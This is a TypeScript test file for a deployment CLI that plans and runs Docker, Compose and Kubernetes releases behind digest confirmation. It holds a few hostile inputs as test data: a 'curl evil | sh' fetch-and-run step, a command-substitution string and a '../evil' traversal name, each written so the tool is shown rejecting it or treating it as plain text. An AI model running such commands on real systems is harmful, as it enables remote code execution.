import { execFile } from 'node:child_process';
import { mkdir, mkdtemp, readFile, realpath, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';
import { afterEach, describe, expect, it } from 'vitest';
import {
  applyDeployFiles, builtInDeployTargets, defineDeployTarget, kubernetesTarget, listDeployTargets, planDeploy, planDeployFiles, readDeployConfig, releaseSlug,
  resolveDeployTarget, runDeployPlan, spawnDeployStep, type DeployRunner, type DeployStep, type DeployTarget,
} from '../src/deploy-index.js';

const directories: string[] = [];
afterEach(async () => { for (const path of directories.splice(0)) await rm(path, { recursive: true, force: true }); });
async function project(files: Record<string, string> = {}): Promise<string> {
  const root = await realpath(await mkdtemp(join(tmpdir(), 'mayura-deploy-test-'))); directories.push(root);
  const all = { 'package.json': JSON.stringify({ name: '@acme/Support Agent', version: '1.4.0' }), ...files };
  for (const [path, content] of Object.entries(all)) { await mkdir(join(root, path, '..'), { recursive: true }); await writeFile(join(root, path), content); }
  return root;
}
const config = (extra: object = {}) => JSON.stringify({ format: 'mayura.deploy.v1', image: 'registry.example.com/acme/support', env: ['OPENAI_API_KEY'], ...extra });
async function initialized(target: DeployTarget = kubernetesTarget as unknown as DeployTarget, files: Record<string, string> = { 'mayura.deploy.json': config() }): Promise<string> {
  const root = await project(files); await applyDeployFiles(await planDeployFiles(target, root)); return root;
}
const recorder = (exitCodes: Record<string, number> = {}) => {
  const ran: DeployStep[] = [];
  const runner: DeployRunner = async step => { ran.push(step); return { exitCode: exitCodes[step.id] ?? 0 }; };
  return { ran, runner };
};

describe('deploy configuration', () => {
  it('reads mayura.deploy.json beside package.json, with DNS-safe defaults', async () => {
    expect((await readDeployConfig(await project())).project).toEqual({ name: 'support-agent', app: 'dist/src/app.js', port: 8080, probePort: 9090, env: [] });
    const rooted = await project({ 'tsconfig.json': JSON.stringify({ compilerOptions: { rootDir: 'src', outDir: 'build' } }) });
    expect((await readDeployConfig(rooted)).project.app).toBe('build/app.js');
    const configured = await readDeployConfig(await project({ 'mayura.deploy.json': config({ name: 'refunds', app: 'dist/app.js', port: 3000, targets: { kubernetes: { namespace: 'agents' } } }) }));
    expect(configured).toMatchObject({ exists: true, version: '1.4.0', targets: { kubernetes: { namespace: 'agents' } },
      project: { name: 'refunds', app: 'dist/app.js', image: 'registry.example.com/acme/support', port: 3000, env: ['OPENAI_API_KEY'] } });
  });

  it.each([
    [{ format: 'v2' }, /format/u], [{ format: 'mayura.deploy.v1', extra: true }, /allows only/u], [{ format: 'mayura.deploy.v1', name: 'Bad_Name' }, /name/u],
    [{ format: 'mayura.deploy.v1', app: '../outside.js' }, /app/u], [{ format: 'mayura.deploy.v1', app: 'dist/app.ts' }, /app/u],
    [{ format: 'mayura.deploy.v1', image: 'registry.example.com/acme/support:1.0' }, /image/u], [{ format: 'mayura.deploy.v1', image: 'Registry/UPPER' }, /image/u],
    [{ format: 'mayura.deploy.v1', env: ['openai_key'] }, /env/u], [{ format: 'mayura.deploy.v1', env: ['A', 'A'] }, /env/u], [{ format: 'mayura.deploy.v1', port: 70_000 }, /port/u],
  ])('refuses a malformed mayura.deploy.json (%#)', async (value, message) => {
    await expect(readDeployConfig(await project({ 'mayura.deploy.json': JSON.stringify(value) }))).rejects.toMatchObject({ code: 'INVALID_CONFIG', message: expect.stringMatching(message) });
  });
});

describe('deploy init', () => {
  it('plans a target\'s files and a configuration, writes them, then keeps them', async () => {
    const root = await project();
    const plan = await planDeployFiles(kubernetesTarget as unknown as DeployTarget, root);
    expect(plan.changes.map(change => [change.path, change.operation])).toEqual([['Dockerfile', 'create'], ['.dockerignore', 'create'],
      ['deploy/kubernetes/migrate-job.yaml', 'create'], ['deploy/kubernetes/server.yaml', 'create'], ['deploy/kubernetes/worker.yaml', 'create'], ['mayura.deploy.json', 'create']]);
    await applyDeployFiles(plan);
    expect(JSON.parse(await readFile(join(root, 'mayura.deploy.json'), 'utf8'))).toMatchObject({ format: 'mayura.deploy.v1', name: 'support-agent', targets: { kubernetes: {} } });
    expect(await readFile(join(root, 'deploy/kubernetes/worker.yaml'), 'utf8')).toContain('secretRef: { name: support-agent-env }');
    expect(await readFile(join(root, 'Dockerfile'), 'utf8')).toContain('CMD ["serve", "--app", "dist/src/app.js"]');
    const again = await planDeployFiles(kubernetesTarget as unknown as DeployTarget, root);
    expect(again.changes.every(change => change.operation === 'unchanged')).toBe(true);
  });

  it('replaces an edited file only with the plan digest, and never a plan from elsewhere', async () => {
    const root = await initialized();
    await writeFile(join(root, 'Dockerfile'), 'FROM scratch\n');
    const plan = await planDeployFiles(kubernetesTarget as unknown as DeployTarget, root);
    expect(plan.changes.find(change => change.path === 'Dockerfile')).toMatchObject({ operation: 'replace', diff: expect.stringContaining('-FROM scratch') });
    await expect(applyDeployFiles(plan)).rejects.toMatchObject({ code: 'PERMISSION_DENIED' });
    const fresh = await planDeployFiles(kubernetesTarget as unknown as DeployTarget, root);
    await expect(applyDeployFiles({ ...fresh })).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
    await applyDeployFiles(fresh, { confirmation: fresh.digest });
    expect(await readFile(join(root, 'Dockerfile'), 'utf8')).toContain('FROM node:24');
  });
});

describe('deploy plans', () => {
  it('plans a Kubernetes release: image, migration Job, wait, rollout, with the manifests rendered for the release', async () => {
    const root = await initialized(undefined, { 'mayura.deploy.json': config({ targets: { kubernetes: { namespace: 'agents', context: 'prod-eu' } } }) });
    const plan = await planDeploy(kubernetesTarget as unknown as DeployTarget, root, { tag: 'v1.4.0_RC' });
    const image = 'registry.example.com/acme/support:v1.4.0_RC'; const kubectl = ['--context', 'prod-eu', '--namespace', 'agents'];
    expect(plan.release).toEqual({ tag: 'v1.4.0_RC', image });
    expect(plan.steps.map(step => [step.id, step.tool, step.args])).toEqual([
      ['build-image', 'docker', ['build', '--tag', image, '.']], ['push-image', 'docker', ['push', image]],
      ['migrate', 'kubectl', [...kubectl, 'apply', '-f', '-']],
      ['migrate-finish', 'kubectl', [...kubectl, 'wait', '--for=jsonpath={.status.conditions[0].type}', '--timeout=600s', 'job/support-agent-migrate-v1-4-0-rc']],
      ['migrate-logs', 'kubectl', [...kubectl, 'logs', 'job/support-agent-migrate-v1-4-0-rc']],
      ['migrate-wait', 'kubectl', [...kubectl, 'wait', '--for=condition=complete', '--timeout=30s', 'job/support-agent-migrate-v1-4-0-rc']],
      ['roll-out', 'kubectl', [...kubectl, 'apply', '-f', '-']],
      ['server-ready', 'kubectl', [...kubectl, 'rollout', 'status', 'deployment/support-agent-server', '--timeout=600s']],
      ['worker-ready', 'kubectl', [...kubectl, 'rollout', 'status', 'deployment/support-agent-worker', '--timeout=600s']],
    ]);
    const job = plan.steps[2]!.stdin!; const workloads = plan.steps[6]!.stdin!;
    expect(job).toContain('name: support-agent-migrate-v1-4-0-rc'); expect(job).toContain(`image: ${image}`);
    expect(workloads.match(new RegExp(`image: ${image.replaceAll('.', '\\.')}`, 'gu'))).toHaveLength(2);
    expect(`${job}${workloads}`).not.toMatch(/mayura-app-image|mayura-release/u);
    // The digest covers what is applied, so an edited manifest is a different plan.
    await writeFile(join(root, 'deploy/kubernetes/server.yaml'), (await readFile(join(root, 'deploy/kubernetes/server.yaml'), 'utf8')).replace('replicas: 2', 'replicas: 3'));
    expect((await planDeploy(kubernetesTarget as unknown as DeployTarget, root, { tag: 'v1.4.0_RC' })).digest).not.toBe(plan.digest);
  });

  it('keeps Kubernetes names within 63 characters', () => {
    expect(releaseSlug('2026.10.01-hotfix-for-the-big-outage')).toHaveLength(13);
    expect(`${'a'.repeat(40)}-migrate-${releaseSlug('2026.10.01-hotfix-for-the-big-outage')}`.length).toBeLessThanOrEqual(63);
    expect(releaseSlug('___')).toBe('release');
  });

  it('plans Compose and image-only releases', async () => {
    const compose = await initialized(builtInDeployTargets['compose']!);
    expect((await planDeploy(builtInDeployTargets['compose']!, compose)).steps.map(step => step.args.join(' '))).toEqual([
      'compose --project-name support-agent build', 'compose --project-name support-agent run --rm migrate', 'compose --project-name support-agent up --detach --wait server worker']);
    expect(await readFile(join(compose, 'compose.yaml'), 'utf8')).toContain('command: ["worker", "--app", "dist/src/app.js", "--probe-host", "0.0.0.0", "--probe-port", "9090"]');
    const docker = await initialized(builtInDeployTargets['docker']!);
    expect((await planDeploy(builtInDeployTargets['docker']!, docker)).steps.map(step => step.args)).toEqual([
      ['build', '--tag', 'registry.example.com/acme/support:1.4.0', '.'], ['push', 'registry.example.com/acme/support:1.4.0']]);
  });

  it('refuses a release without its files, image or tag, or with a manifest that lost its placeholder', async () => {
    await expect(planDeploy(kubernetesTarget as unknown as DeployTarget, await project({ 'mayura.deploy.json': config() }))).rejects.toMatchObject({ code: 'NOT_FOUND', message: expect.stringContaining('deploy init') });
    const noImage = await initialized(undefined, { 'mayura.deploy.json': JSON.stringify({ format: 'mayura.deploy.v1' }) });
    await expect(planDeploy(kubernetesTarget as unknown as DeployTarget, noImage)).rejects.toMatchObject({ code: 'INVALID_CONFIG', message: expect.stringContaining('image') });
    const root = await initialized();
    await writeFile(join(root, 'package.json'), JSON.stringify({ name: 'x' }));
    await expect(planDeploy(kubernetesTarget as unknown as DeployTarget, root)).rejects.toMatchObject({ code: 'INVALID_CONFIG', message: expect.stringContaining('tag') });
    await expect(planDeploy(kubernetesTarget as unknown as DeployTarget, root, { tag: 'bad tag' })).rejects.toMatchObject({ code: 'INVALID_CONFIG', message: expect.stringContaining('image tag') });
    await writeFile(join(root, 'deploy/kubernetes/worker.yaml'), 'kind: Deployment\n');
    await expect(planDeploy(kubernetesTarget as unknown as DeployTarget, root, { tag: 'v1' })).rejects.toMatchObject({ code: 'INVALID_CONFIG', message: expect.stringContaining('placeholder') });
  });

  it('refuses a target that plans a tool it did not declare, or steps outside the bounds', async () => {
    const sneaky = defineDeployTarget({ id: 'sneaky', description: 'x', tools: ['docker'], settings: () => ({}), files: () => ({}),
      plan: () => [{ id: 'shell', description: 'x', tool: 'sh', args: ['-c', 'curl evil | sh'] }] });
    await expect(planDeploy(sneaky as DeployTarget, await project(), { tag: 'v1' })).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
    const nul = defineDeployTarget({ id: 'nul', description: 'x', tools: ['docker'], settings: () => ({}), files: () => ({}),
      plan: () => [{ id: 'a', description: 'x', tool: 'docker', args: ['a\0b'] }] });
    await expect(planDeploy(nul as DeployTarget, await project(), { tag: 'v1' })).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
    expect(() => defineDeployTarget({ id: 'Bad', description: 'x', tools: ['docker'], settings: () => ({}), files: () => ({}), plan: () => [] })).toThrow(expect.objectContaining({ code: 'INVALID_CONFIG' }));
    expect(() => defineDeployTarget({ id: 'ok', description: 'x', tools: ['/bin/sh'], settings: () => ({}), files: () => ({}), plan: () => [] })).toThrow(expect.objectContaining({ code: 'INVALID_CONFIG' }));
  });
});

describe('deploy runs', () => {
  it('runs only a genuine plan confirmed with its digest, in order', async () => {
    const root = await initialized();
    const plan = await planDeploy(kubernetesTarget as unknown as DeployTarget, root, { tag: 'v1' }); const { ran, runner } = recorder();
    await expect(runDeployPlan(plan, { confirmation: 'wrong', runner })).rejects.toMatchObject({ code: 'PERMISSION_DENIED' });
    await expect(runDeployPlan({ ...plan }, { confirmation: plan.digest, runner })).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
    expect(ran).toEqual([]);
    const events: string[] = [];
    const result = await runDeployPlan(plan, { confirmation: plan.digest, runner, onStep: event => events.push(`${event.id}:${event.status}`) });
    expect(result).toMatchObject({ status: 'succeeded', release: { tag: 'v1' } });
    expect(ran.map(step => step.id)).toEqual(['build-image', 'push-image', 'migrate', 'migrate-finish', 'migrate-logs', 'migrate-wait', 'roll-out', 'server-ready', 'worker-ready']);
    expect(events.slice(0, 2)).toEqual(['build-image:started', 'build-image:succeeded']);
    // A plan runs once.
    await expect(runDeployPlan(plan, { confirmation: plan.digest, runner })).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
  });

  it('stops at the first failing step and skips the rest, so a failed migration never rolls out', async () => {
    const root = await initialized();
    const plan = await planDeploy(kubernetesTarget as unknown as DeployTarget, root, { tag: 'v1' }); const { ran, runner } = recorder({ 'migrate-wait': 1 });
    const result = await runDeployPlan(plan, { confirmation: plan.digest, runner });
    expect(result.status).toBe('failed');
    expect(result.steps.map(step => `${step.id}:${step.status}`)).toEqual(['build-image:succeeded', 'push-image:succeeded', 'migrate:succeeded', 'migrate-finish:succeeded', 'migrate-logs:succeeded', 'migrate-wait:failed',
      'roll-out:skipped', 'server-ready:skipped', 'worker-ready:skipped']);
    expect(ran.map(step => step.id)).not.toContain('roll-out');
  });

  it('cancels: the running step is stopped and nothing more runs', async () => {
    const root = await initialized();
    const plan = await planDeploy(kubernetesTarget as unknown as DeployTarget, root, { tag: 'v1' }); const controller = new AbortController(); const ran: string[] = [];
    const runner: DeployRunner = async (step, { signal }) => { ran.push(step.id); if (step.id === 'push-image') { controller.abort(); expect(signal.aborted).toBe(true); return { exitCode: 143 }; } return { exitCode: 0 }; };
    const result = await runDeployPlan(plan, { confirmation: plan.digest, runner, signal: controller.signal });
    expect(result.status).toBe('cancelled'); expect(ran).toEqual(['build-image', 'push-image']);
    expect(result.steps.slice(1).map(step => step.status)).toEqual(['cancelled', 'skipped', 'skipped', 'skipped', 'skipped', 'skipped', 'skipped', 'skipped']);
  });

  it('spawns tools without a shell, gives them their input, and reports a missing tool or a stopped one', async () => {
    const root = await project(); const signal = new AbortController().signal;
    const echo: DeployStep = { id: 'echo', description: 'x', tool: process.execPath, args: ['-e', 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>process.exit(s==="kind: Job\\n"?0:3))'], stdin: 'kind: Job\n' };
    expect(await spawnDeployStep(echo, { directory: root, signal })).toEqual({ exitCode: 0 });
    // Metacharacters reach the program as text: no shell interprets them.
    const literal: DeployStep = { id: 'literal', description: 'x', tool: process.execPath, args: ['-e', 'process.exit(process.argv[1]==="$(exit 9); echo hi"?0:4)', '$(exit 9); echo hi'] };
    expect(await spawnDeployStep(literal, { directory: root, signal })).toEqual({ exitCode: 0 });
    await expect(spawnDeployStep({ id: 'x', description: 'x', tool: 'mayura-no-such-tool', args: [] }, { directory: root, signal })).rejects.toMatchObject({ code: 'NOT_FOUND' });
    const controller = new AbortController();
    const slow = spawnDeployStep({ id: 'slow', description: 'x', tool: process.execPath, args: ['-e', 'setTimeout(()=>{},60000)'] }, { directory: root, signal: controller.signal });
    setTimeout(() => controller.abort(), 200);
    expect((await slow).exitCode).not.toBe(0);
  });
});

describe('deploy targets', () => {
  it('resolves built-in targets, and @mayurajs/deploy-* packages installed in the project', async () => {
    const root = await project();
    expect((await resolveDeployTarget('kubernetes', root, builtInDeployTargets)).id).toBe('kubernetes');
    const pkg = join(root, 'node_modules', '@mayurajs', 'deploy-acme');
    await mkdir(join(pkg, 'dist'), { recursive: true });
    await writeFile(join(pkg, 'package.json'), JSON.stringify({ name: '@mayurajs/deploy-acme', type: 'module', exports: { '.': { types: './dist/index.d.ts', import: './dist/index.js' } } }));
    await writeFile(join(pkg, 'dist', 'index.js'), `export default { id: 'acme', description: 'Acme Cloud', tools: ['acme'], settings: () => ({}), files: () => ({}), plan: () => [{ id: 'up', description: 'Up', tool: 'acme', args: ['up'] }] };\n`);
    const acme = await resolveDeployTarget('acme', root, builtInDeployTargets);
    expect(acme).toMatchObject({ id: 'acme', tools: ['acme'] });
    expect((await planDeploy(acme, root, { tag: 'v1' })).steps).toEqual([{ id: 'up', description: 'Up', tool: 'acme', args: ['up'] }]);
    expect((await listDeployTargets(root, builtInDeployTargets)).map(target => `${target.id}:${target.source}`)).toEqual(['docker:built in', 'compose:built in', 'kubernetes:built in', 'acme:@mayurajs/deploy-acme']);
    await expect(resolveDeployTarget('missing', root, builtInDeployTargets)).rejects.toMatchObject({ code: 'NOT_FOUND', message: expect.stringContaining('@mayurajs/deploy-missing') });
    await expect(resolveDeployTarget('../evil', root, builtInDeployTargets)).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
    const other = join(root, 'node_modules', '@mayurajs', 'deploy-other');
    await mkdir(join(other, 'dist'), { recursive: true }); await writeFile(join(other, 'package.json'), JSON.stringify({ name: '@mayurajs/deploy-other', type: 'module', exports: { '.': { import: './dist/index.js' } } }));
    await writeFile(join(other, 'dist', 'index.js'), `export default { id: 'acme', description: 'x', tools: ['acme'], settings: () => ({}), files: () => ({}), plan: () => [] };\n`);
    await expect(resolveDeployTarget('other', root, builtInDeployTargets)).rejects.toMatchObject({ code: 'INVALID_CONFIG', message: expect.stringContaining('not other') });
  });
});

describe('mayura deploy', () => {
  const bin = fileURLToPath(new URL('../dist/bin.js', import.meta.url));
  const cli = async (args: string[]) => {
    try { const { stdout } = await promisify(execFile)(process.execPath, [bin, ...args, '--json']); return { code: 0, json: JSON.parse(stdout) }; }
    catch (error) { const failure = error as { code: number; stderr: string }; return { code: failure.code, json: JSON.parse(failure.stderr) }; }
  };

  it('plans and writes files, plans a release, and refuses to run without the digest', async () => {
    const root = await project({ 'mayura.deploy.json': config() });
    expect(await cli(['deploy', 'init', '--target', 'kubernetes', '--directory', root])).toMatchObject({ code: 0, json: { status: 'planned', deploy: 'files' } });
    expect(await cli(['deploy', 'init', '--target', 'kubernetes', '--directory', root, '--apply'])).toMatchObject({ code: 0, json: { status: 'succeeded' } });
    const planned = await cli(['deploy', '--target', 'kubernetes', '--directory', root, '--tag', 'v2']);
    expect(planned).toMatchObject({ code: 0, json: { status: 'planned', deploy: 'plan', plan: { release: { tag: 'v2' } } } });
    expect(await cli(['deploy', '--target', 'kubernetes', '--directory', root, '--tag', 'v2', '--apply'])).toMatchObject({ code: 1, json: { status: 'failed', error: { code: 'INVALID_INPUT' } } });
    expect(await cli(['deploy', '--target', 'kubernetes', '--directory', root, '--tag', 'v2', '--apply', '--confirm', 'f'.repeat(64)])).toMatchObject({ code: 1, json: { error: { code: 'PERMISSION_DENIED' } } });
    expect(await cli(['deploy', 'targets', '--directory', root])).toMatchObject({ code: 0, json: { targets: [{ id: 'docker' }, { id: 'compose' }, { id: 'kubernetes' }] } });
    expect(await cli(['deploy', '--directory', root])).toMatchObject({ code: 1, json: { error: { code: 'INVALID_INPUT' } } });
  });
});
